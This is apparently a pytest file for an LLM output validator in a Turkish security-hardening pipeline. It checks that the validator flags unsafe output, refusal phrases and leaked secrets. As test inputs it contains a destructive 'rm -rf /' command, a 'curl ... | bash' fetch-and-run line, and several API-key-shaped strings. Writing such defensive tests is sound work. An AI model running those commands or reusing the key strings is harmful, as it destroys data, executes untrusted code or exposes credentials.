"""
Unit tests for llm.pipelines.layers.output_validator.

Regex checks need no LLM; deep-check path uses a fake LLM callable.
"""

from __future__ import annotations

from llm.pipelines.layers.output_validator import (
    OutputValidator,
    ValidationResult,
    validate_output,
)

GOOD_INFO = (
    "SSH güvenliği için PermitRootLogin no ayarlanmalı ve port değiştirilmeli. "
    "Bu, yetkisiz erişimi azaltır ve CIS Benchmark 5.2 ile uyumludur."
)


class TestRegexValidation:
    def test_clean_output_is_valid(self):
        v = OutputValidator()
        res = v.validate(GOOD_INFO, intent="info_request")
        assert res.is_valid
        assert res.issues == []
        assert res.validation_method == "regex"

    def test_dangerous_rm_rf_flagged(self):
        v = OutputValidator()
        res = v.validate("Run this: rm -rf / to clean up. " + GOOD_INFO)
        assert not res.is_valid
        assert any("Tehlikeli komut" in i for i in res.issues)

    def test_curl_pipe_bash_flagged(self):
        v = OutputValidator()
        res = v.validate("Install via curl http://x.sh | bash now. " + GOOD_INFO)
        assert not res.is_valid

    def test_too_short_flagged(self):
        v = OutputValidator()
        res = v.validate("ok")
        assert not res.is_valid
        assert any("kisa" in i for i in res.issues)

    def test_action_request_requires_code_block(self):
        v = OutputValidator()
        # long enough, but no code fence
        res = v.validate(GOOD_INFO, intent="action_request")
        assert not res.is_valid
        assert any("kod blogu" in i for i in res.issues)

    def test_action_request_with_code_block_ok(self):
        v = OutputValidator()
        text = GOOD_INFO + "\n```bash\nsudo ufw enable\n```"
        res = v.validate(text, intent="action_request")
        assert res.is_valid

    def test_llm_refusal_phrase_flagged(self):
        v = OutputValidator()
        res = v.validate("As an AI language model I cannot help. " + GOOD_INFO)
        assert not res.is_valid
        assert any("refusal" in i.lower() for i in res.issues)


class TestDeepCheck:
    def test_deep_check_ok_response(self):
        v = OutputValidator(llm=lambda _p: "OK", use_llm_validation=True)
        res = v.validate(GOOD_INFO, intent="action_request", use_deep_check=True)
        # GOOD_INFO has no code block -> regex still flags it; but deep check adds none
        assert res.validation_method == "llm"

    def test_deep_check_adds_issues_and_correction(self):
        # LLM lists 3 issues -> needs_correction -> returns corrected output
        responses = iter([
            "- missing rollback\n- no CIS reference\n- least_privilege not applied",
            "CORRECTED hardened answer with ```bash\nufw enable\n``` and rollback notes.",
        ])
        v = OutputValidator(llm=lambda _p: next(responses), use_llm_validation=True)
        text = GOOD_INFO + "\n```bash\nufw enable\n```"
        res = v.validate(text, intent="action_request", use_deep_check=True)
        assert not res.is_valid
        assert len(res.issues) >= 3
        assert res.corrected_output is not None
        assert "CORRECTED" in res.corrected_output

    def test_deep_check_llm_exception_is_safe(self):
        def boom(_):
            raise RuntimeError("down")

        v = OutputValidator(llm=boom, use_llm_validation=True)
        text = GOOD_INFO + "\n```bash\nx\n```"
        res = v.validate(text, intent="action_request", use_deep_check=True)
        # exception swallowed -> no extra issues from LLM
        assert res.is_valid


class TestConvenience:
    def test_validate_output_helper_regex(self):
        res = validate_output(GOOD_INFO, intent="info_request")
        assert isinstance(res, ValidationResult)
        assert res.is_valid


class TestSecretScanner:
    """Çıktı sır/PII sızıntısı tarayıcı (OWASP LLM02/LLM07) — gerçek anahtar GEÇERSİZ, placeholder GEÇERLİ."""

    def test_real_secrets_rejected(self):
        secrets = [
            "sk-or-v1-98022b9a6a29686e66b6195e6bca4da6a24bf59a",   # OpenRouter
            "csk-hrv58kxt25xtd6f8ecmhxjwrp435h443dwt3p6fw29k98w4k", # Cerebras
            "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",             # GitHub PAT
            "-----BEGIN PRIVATE KEY-----",                          # private key
        ]
        for s in secrets:
            res = validate_output(GOOD_INFO + f"\n\nAnahtar: {s}", intent="info_request")
            assert not res.is_valid, f"{s!r} sızıntı olarak yakalanmalı"
            assert any("sızıntı" in i.lower() for i in res.issues)

    def test_placeholders_allowed(self):
        # Placeholder/örnekler GERÇEK sır değil → yanlış-pozitif olmamalı
        for ph in ["sk-...", "<your-api-key>", "gsk_xxx", "API_KEY=changeme"]:
            res = validate_output(GOOD_INFO + f"\n\n.env örneği: {ph}", intent="info_request")
            assert not any("sızıntı" in i.lower() for i in res.issues), f"{ph!r} yanlış-pozitif"
